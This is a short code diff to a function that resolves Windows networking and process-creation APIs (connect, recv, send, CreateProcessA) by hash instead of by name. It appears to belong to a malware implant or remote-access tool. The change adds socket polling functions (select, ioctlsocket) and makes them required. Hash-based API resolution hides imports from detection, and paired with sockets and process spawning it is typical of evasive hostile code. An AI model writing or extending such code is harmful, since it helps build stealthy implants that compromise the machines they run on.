@@ -133,6 +133,8 @@ bool ResolveAPIs() {
     API.WSACleanup  = (_WSACleanup)  GetProcAddressByHash(hWs2_module, 0X4425AA6D33CE198);
     API.setsockopt  = (_setsockopt)  GetProcAddressByHash(hWs2_module, 0X447119DFC0E4894);
     API.WSAGetLastError = (_WSAGetLastError)    GetProcAddressByHash(hWs2_module, 0X759A3711B5D8C86E);
+    API.ioctlsocket = (_ioctlsocket)            GetProcAddressByHash(hWs2_module, 0X8CF46C22DF45D029);
+    API.select      = (_select)                 GetProcAddressByHash(hWs2_module, 0XAD110305FFBD09E5);
 
     //Resolve Kernel32
     API.CreateProcessA = (_CreateProcessA)      GetProcAddressByHash(hKernel32, 0XF856204117457439);
@@ -197,7 +199,7 @@ bool ResolveAPIs() {
     // Critical: Winsock
     if (!API.WSAStartup || !API.socket || !API.inet_addr || !API.htons || !API.connect
             || !API.recv || !API.send || !API.closesocket || !API.WSACleanup || !API.setsockopt
-            || !API.WSAGetLastError)
+            || !API.WSAGetLastError || !API.select || !API.ioctlsocket)
         return false;
 
     // Critical: Kernel32
